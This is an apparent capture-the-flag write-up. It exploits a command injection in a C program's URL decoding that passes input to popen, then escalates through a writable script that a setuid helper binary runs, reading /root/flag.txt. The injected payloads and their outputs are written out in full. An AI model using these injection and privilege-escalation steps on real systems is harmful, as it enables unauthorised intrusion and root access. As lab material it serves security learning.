looking at the c code, we can in `urldecode2` that the logic to process `%`  is complete dog shit and we can inject arbitrary values in the variable `combinedString` to be run by `popen`.

entering `%; whoami;` will yield `www-data`

let's find files with setuid with `%; find / -perm -4000 2>/dev/null;`

```
/usr/bin/mount  
/usr/bin/chfn  
/usr/bin/passwd  
/usr/bin/umount  
/usr/bin/gpasswd  
/usr/bin/su  
/usr/bin/newgrp  
/usr/bin/chsh  
/usr/local/bin/admin_help
```

`/usr/local/bin/admin_help` is not a regular command, let's try it with `%; /usr/local/bin/admin_help 2>&1;`

```
Your wish is my command... maybe :)  
Bad String in File.
```

this is likely part of the ctf, let's see if we can find something helpful with `%; strings /usr/local/bin/admin_help 2>&1;` 

```
[...]
wish.sh  
[]A\  
[]A\  
Error opening original file  
Bad String in File.  
Your wish is my command... maybe :)
chmod +x /tmp/wish.sh && /tmp/wish.sh
[...]
```

looks like it's gonna let us make some wishes... how about we try to write a script in `/tmp/wish.sh` with `%; echo "cat /root/flag.txt" > /tmp/wish.sh 2>/dev/null;`

and run it again with `%; /usr/local/bin/admin_help 2>&1;`

```
flag{93541544b91b7d2b9d61e90becbca309}Your wish is my command... maybe :)
```